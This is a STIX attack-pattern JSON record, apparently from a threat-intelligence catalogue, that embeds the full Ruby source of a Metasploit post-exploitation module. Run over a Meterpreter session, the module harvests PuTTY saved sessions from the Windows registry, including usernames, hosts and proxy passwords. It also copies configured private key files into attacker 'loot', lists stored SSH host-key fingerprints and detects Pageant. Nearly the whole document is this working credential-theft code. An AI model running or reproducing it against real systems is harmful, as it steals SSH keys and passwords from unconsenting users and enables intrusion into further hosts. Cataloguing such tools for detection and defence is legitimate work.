{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--80ae37ef-33f4-4700-8a1e-118371c200f1",
    "created": "2024-08-14T16:33:05.033794Z",
    "modified": "2024-08-14T16:33:05.033797Z",
    "name": "PuTTY Saved Sessions Enumeration Module",
    "description": " This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session information from the registry. PuTTY is very configurable; some users may have configured saved sessions which could include a username, private key file to use when authenticating host name etc.  If a private key is configured, an attempt will be made to download and store it in loot. It will also record the SSH host keys which have been stored. These will be connections that the user has previously after accepting the host SSH fingerprint and therefore are of particular interest if they are within scope of a penetration test.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_putty_saved_sessions.rb",
            "external_id": "enum_putty_saved_sessions.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings', 'ProxyUsername', 'ProxyPassword']\n  PAGEANT_REGISTRY_KEY = 'HKCU\\\\Software\\\\SimonTatham\\\\PuTTY'\n  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PuTTY Saved Sessions Enumeration Module',\n        'Description' => %q{\n          This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session\n          information from the registry. PuTTY is very configurable; some users may have configured\n          saved sessions which could include a username, private key file to use when authenticating,\n          host name etc.  If a private key is configured, an attempt will be made to download and store\n          it in loot. It will also record the SSH host keys which have been stored. These will be connections that\n          the user has previously after accepting the host SSH fingerprint and therefore are of particular\n          interest if they are within scope of a penetration test.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def get_saved_session_details(sessions)\n    all_sessions = []\n    sessions.each do |ses|\n      newses = {}\n      newses['Name'] = Rex::Text.uri_decode(ses)\n      INTERESTING_KEYS.each do |key|\n        newses[key] = registry_getvaldata(\"#{PAGEANT_REGISTRY_KEY}\\\\Sessions\\\\#{ses}\", key).to_s\n      end\n      all_sessions << newses\n      report_note(host: target_host, type: 'putty.savedsession', data: newses, update: :unique_data)\n    end\n    all_sessions\n  end\n\n  def display_saved_sessions_report(info)\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'PuTTY Saved Sessions',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => ['Name'].append(INTERESTING_KEYS).flatten\n    )\n\n    info.each do |result|\n      row = []\n      row << result['Name']\n      INTERESTING_KEYS.each do |key|\n        row << result[key]\n      end\n      results_table << row\n    end\n\n    print_line\n    print_line results_table.to_s\n    stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, 'PuTTY Saved Sessions List')\n    print_good(\"PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).\")\n  end\n\n  def display_private_key_analysis(info)\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'PuTTY Private Keys',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => PUTTY_PRIVATE_KEY_ANALYSIS\n    )\n\n    info.each do |result|\n      row = []\n      PUTTY_PRIVATE_KEY_ANALYSIS.each do |key|\n        row << result[key]\n      end\n      results_table << row\n    end\n\n    print_line\n    print_line results_table.to_s\n    # stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, \"PuTTY Saved Sessions List\")\n    # print_good(\"PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).\")\n  end\n\n  def get_stored_host_key_details(allkeys)\n    # This hash will store (as the key) host:port pairs. This is basically a quick way of\n    # getting a unique list of host:port pairs.\n    all_ssh_host_keys = {}\n\n    # This regex will split up lines such as rsa2@22:127.0.0.1 from the registry.\n    rx_split_hostporttype = /^(?<type>[-a-z0-9]+?)@(?<port>[0-9]+?):(?<host>.+)$/i\n\n    # Go through each of the stored keys found in the registry\n    allkeys.each do |key|\n      # Store the raw key and value in a hash to start off with\n      newkey = {\n        rawname: key,\n        rawsig: registry_getvaldata(\"#{PAGEANT_REGISTRY_KEY}\\\\SshHostKeys\", key).to_s\n      }\n\n      # Take the key and split up host, port and fingerprint type. If it matches, store the information\n      # in the hash for later.\n      split_hostporttype = rx_split_hostporttype.match(key.to_s)\n      if split_hostporttype\n\n        # Extract the host, port and key type into the hash\n        newkey['host'] = split_hostporttype[:host]\n        newkey['port'] = split_hostporttype[:port]\n        newkey['type'] = split_hostporttype[:type]\n\n        # Form the key\n        host_port = \"#{newkey['host']}:#{newkey['port']}\"\n\n        # Add it to the consolidation hash. If the same IP has different key types, append to the array\n        all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?\n        all_ssh_host_keys[host_port] << newkey['type']\n      end\n      report_note(host: target_host, type: 'putty.storedfingerprint', data: newkey, update: :unique_data)\n    end\n    all_ssh_host_keys\n  end\n\n  def display_stored_host_keys_report(info)\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Stored SSH host key fingerprints',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => ['SSH Endpoint', 'Key Type(s)']\n    )\n\n    info.each do |key, result|\n      row = []\n      row << key\n      row << result.join(', ')\n      results_table << row\n    end\n\n    print_line\n    print_line results_table.to_s\n    stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, 'PuTTY Stored SSH Host Keys List')\n    print_good(\"PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).\")\n  end\n\n  def grab_private_keys(sessions)\n    private_key_summary = []\n    sessions.each do |ses|\n      filename = ses['PublicKeyFile'].to_s\n      next if filename.empty?\n\n      # Check whether the file exists.\n      if file?(filename)\n        ppk = read_file(filename)\n        if ppk # Attempt to read the contents of the file\n          stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)\n          print_good(\"PuTTY private key file for \\'#{ses['Name']}\\' (#{filename}) saved to: #{stored_path}\")\n\n          # Now analyse the private key\n          private_key = {}\n          private_key['Name'] = ses['Name']\n          private_key['UserName'] = ses['UserName']\n          private_key['HostName'] = ses['HostName']\n          private_key['PublicKeyFile'] = ses['PublicKeyFile']\n          private_key['Type'] = ''\n          private_key['Cipher'] = ''\n          private_key['Comment'] = ''\n\n          # Get type of key\n          if ppk.to_s =~ /^SSH PRIVATE KEY FILE FORMAT 1.1/\n            # This is an SSH1 header\n            private_key['Type'] = 'ssh1'\n            private_key['Comment'] = '-'\n            if ppk[33] == \"\\x00\"\n              private_key['Cipher'] = 'none'\n            elsif ppk[33] == \"\\x03\"\n              private_key['Cipher'] = '3DES'\n            else\n              private_key['Cipher'] = '(Unrecognised)'\n            end\n          elsif (rx = /^PuTTY-User-Key-File-2:\\sssh-(?<keytype>rsa|dss)[\\r\\n]/.match(ppk.to_s))\n            # This is an SSH2 header\n            private_key['Type'] = \"ssh2 (#{rx[:keytype]})\"\n            if (rx = /^Encryption:\\s(?<cipher>[-a-z0-9]+?)[\\r\\n]/.match(ppk.to_s))\n              private_key['Cipher'] = rx[:cipher]\n            else\n              private_key['Cipher'] = '(Unrecognised)'\n            end\n\n            if (rx = /^Comment:\\s(?<comment>.+?)[\\r\\n]/.match(ppk.to_s))\n              private_key['Comment'] = rx[:comment]\n            end\n          end\n          private_key_summary << private_key\n        else\n          print_error(\"Unable to read PuTTY private key file for \\'#{ses['Name']}\\' (#{filename})\") # May be that we do not have permissions etc\n        end\n      else\n        print_error(\"PuTTY private key file for \\'#{ses['Name']}\\' (#{filename}) could not be read.\")\n      end\n    end\n    private_key_summary\n  end\n\n  # Entry point\n  def run\n    # Look for saved sessions, break out if not.\n    print_status('Looking for saved PuTTY sessions')\n    saved_sessions = registry_enumkeys(\"#{PAGEANT_REGISTRY_KEY}\\\\Sessions\")\n    if saved_sessions.nil? || saved_sessions.empty?\n      print_error('No saved sessions found')\n    else\n\n      # Tell the user how many sessions have been found (with correct English)\n      print_status(\"Found #{saved_sessions.count} session#{saved_sessions.count > 1 ? 's' : ''}\")\n\n      # Retrieve the saved session details & print them to the screen in a report\n      all_saved_sessions = get_saved_session_details(saved_sessions)\n      display_saved_sessions_report(all_saved_sessions)\n\n      # If the private key file has been configured, retrieve it and save it to loot\n      print_status('Downloading private keys...')\n      private_key_info = grab_private_keys(all_saved_sessions)\n      if !private_key_info.nil? && !private_key_info.empty?\n        print_line\n        display_private_key_analysis(private_key_info)\n      end\n    end\n\n    print_line # Just for readability\n\n    # Now search for SSH stored keys. These could be useful because it shows hosts that the user\n    # has previously connected to and accepted a key from.\n    print_status('Looking for previously stored SSH host key fingerprints')\n    stored_ssh_host_keys = registry_enumvals(\"#{PAGEANT_REGISTRY_KEY}\\\\SshHostKeys\")\n    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?\n      print_error('No stored SSH host keys found')\n    else\n      # Tell the user how many sessions have been found (with correct English)\n      print_status(\"Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count > 1 ? 's' : ''}\")\n\n      # Retrieve the saved session details & print them to the screen in a report\n      print_status('Downloading stored key fingerprints...')\n      all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)\n      if all_stored_keys.nil? || all_stored_keys.empty?\n        print_error('No stored key fingerprints found')\n      else\n        display_stored_host_keys_report(all_stored_keys)\n      end\n    end\n\n    print_line # Just for readability\n\n    print_status('Looking for Pageant...')\n    hwnd = client.railgun.user32.FindWindowW('Pageant', 'Pageant')\n    if hwnd['return']\n      print_good(\"Pageant is running (Handle 0x#{sprintf('%x', hwnd['return'])})\")\n    else\n      print_error('Pageant is not running')\n    end\n  end\nend\n"
}